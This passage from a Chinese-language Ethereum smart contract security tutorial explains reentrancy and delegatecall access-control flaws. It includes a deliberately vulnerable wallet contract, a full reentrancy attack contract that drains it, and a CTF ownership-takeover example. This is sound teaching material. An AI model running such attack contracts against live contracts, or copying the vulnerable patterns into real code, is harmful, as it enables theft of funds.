            withdrawLog(to, amount);  // 打印日志，方便观察 reentrancy
            to.call.value(amount)();  // 使用 call.value()() 进行 ether 转币时，默认会发所有的 Gas 给外部
            balances[msg.sender] -= amount;
        }
        function balanceOf() returns (uint256) { return balances[msg.sender]; }
        function balanceOf(address addr) returns (uint256) { return balances[addr]; }
    }
这段代码是为了说明重入漏洞原理编写的，实现的是一个类似公共钱包的合约。任何人都可以向 `IDMoney` 存入相应的
Ether，合约会记录每个账户在该合约里的资产（Ether）情况，账户可以查询自身/他人在此合约中的余额，同时也能够通过 `withdraw`
将自己在合约中的 Ether 直接提取出来转给其他账户。
初识以太坊智能合约的人在分析上面这段代码时，应该会认为是一段比较正常的代码逻辑，似乎并没有什么问题。但是我在之前就说了，以太坊智能合约漏洞的出现其实跟自身的语法（语言）特性有很大的关系。这里，我们把焦点放在
`withdraw(address, uint256)` 函数中，合约在进行提币时，使用 `require`
依次判断提币账户是否拥有相应的资产和该合约是否拥有足够的资金可供提币（有点类似于交易所的提币判断），随后使用
`to.call.value(amount)();` 来发送 Ether，处理完成后相应修改用户资产数据。
仔细看过第一部分 I.3 的同学肯定发现了，这里转币的方法用的是 `call.value()()` 的方式，区别于 `send()` 和
`transfer()` 两个相似功能的函数，`call.value()()` 会将剩余的 Gas 全部给予外部调用（fallback 函数），而
`send()` 和 `transfer()` 只会有 2300 的 Gas 量来处理本次转币操作。如果在进行 Ether
交易时目标地址是个合约地址，那么默认会调用该合约的 fallback 函数（存在的情况下，不存在转币会失败，注意 payable 修饰）。
上面说了这么多，显然地，在提币或者说是合约用户在转币的过程中，存在一个递归 `withdraw`
的问题（因为资产修改在转币之后），攻击者可以部署一个包含恶意递归调用的合约将公共钱包合约里的 Ether 全部提出，流程大致是这样的：
（读者可以直接先根据上面的 IDMoney 合约代码写出自己的攻击合约代码，然后在测试环境中进行模拟）
我实现的攻击合约代码如下：
    contract Attack {
        address owner;
        address victim;
        modifier ownerOnly { require(owner == msg.sender); _; }
        function Attack() payable { owner = msg.sender; }
        // 设置已部署的 IDMoney 合约实例地址
        function setVictim(address target) ownerOnly { victim = target; }
        // deposit Ether to IDMoney deployed
        function step1(uint256 amount) ownerOnly payable {
            if (this.balance > amount) {
                victim.call.value(amount)(bytes4(keccak256("deposit()")));
            }
        }
        // withdraw Ether from IDMoney deployed
        function step2(uint256 amount) ownerOnly {
            victim.call(bytes4(keccak256("withdraw(address,uint256)")), this, amount);
        }
        // selfdestruct, send all balance to owner
        function stopAttack() ownerOnly {
            selfdestruct(owner);
        }
        function startAttack(uint256 amount) ownerOnly {
            step1(amount);
            step2(amount / 2);
        }
        function () payable {
            if (msg.sender == victim) {
                // 再次尝试调用 IDCoin 的 sendCoin 函数，递归转币
                victim.call(bytes4(keccak256("withdraw(address,uint256)")), this, msg.value);
            }
        }
    }
使用 `remix-ide` 模拟攻击流程：
著名导致以太坊硬分叉（ETH/ETC）的 The DAO 事件就跟重入漏洞有关，该事件导致 60 多万以太坊被盗。
##### 2\. Access Control
访问控制，在使用 Solidity 编写合约代码时，有几种默认的变量或函数访问域关键字：private, public, external 和
internal，对合约实例方法来讲，默认可见状态为 public，而合约实例变量的默认可见状态为 private。
  * public 标记函数或变量可以被任何账户调用或获取，可以是合约里的函数、外部用户或继承该合约里的函数
  * external 标记的函数只能从外部访问，不能被合约里的函数直接调用，但可以使用 this.func() 外部调用的方式调用该函数
  * private 标记的函数或变量只能在本合约中使用（注：这里的限制只是在代码层面，以太坊是公链，任何人都能直接从链上获取合约的状态信息）
  * internal 一般用在合约继承中，父合约中被标记成 internal 状态变量或函数可供子合约进行直接访问和调用（外部无法直接获取和调用）
Solidity 中除了常规的变量和函数可见性描述外，这里还需要特别提到的就是两种底层调用方式 `call` 和 `delegatecall`：
  * `call` 的外部调用上下文是外部合约
  * `delegatecall` 的外部调用上下是调用合约上下文
简单的用图表示就是：
合约 A 以 `call` 方式调用外部合约 B 的 `func()` 函数，在外部合约 B 上下文执行完 `func()` 后继续返回 A
合约上下文继续执行；而当 A 以 `delegatecall` 方式调用时，相当于将外部合约 B 的 `func()`
代码复制过来（其函数中涉及的变量或函数都需要存在）在 A 上下文空间中执行。
下面代码是 OpenZeppelin CTF 中的题目：
    pragma solidity ^0.4.10;
    contract Delegate {
        address public owner;
        function Delegate(address _owner) {
            owner = _owner;
        }
        function pwn() {
            owner = msg.sender;
        }
    }
    contract Delegation {
        address public owner;
        Delegate delegate;
        function Delegation(address _delegateAddress) {
            delegate = Delegate(_delegateAddress);
            owner = msg.sender;
        }
        function () {
            if (delegate.delegatecall(msg.data)) {
                this;
            }
        }
    }
仔细分析代码，合约 Delegation 在 fallback 函数中使用 `msg.data` 对 Delegate 实例进行了
`delegatecall()` 调用。msg.data 可控，这里攻击者直接用 `bytes4(keccak256("pwn()"))` 即可通过
`delegatecall()` 将已部署的 Delegation `owner` 修改为攻击者自己（msg.sender）。
使用 `remix-ide` 模拟攻击流程：
2017 年下半年出现的智能合约钱包 Parity 被盗事件就跟未授权和 `delegatecall` 有关。
（注：本文上部主要讲解了以太坊智能合约安全的研究基础和两类漏洞原理实例，在《以太坊智能合约安全入门了解一下（下）》中会补全其他几类漏洞的原理讲解，并有一小节
“自我思考” 来总结我在学习和研究以太坊智能合约安全时遇到的细节问题）
参考链接：
  1. 
  2. 
  3. 
  4. 
  5. 
  6. 
* * *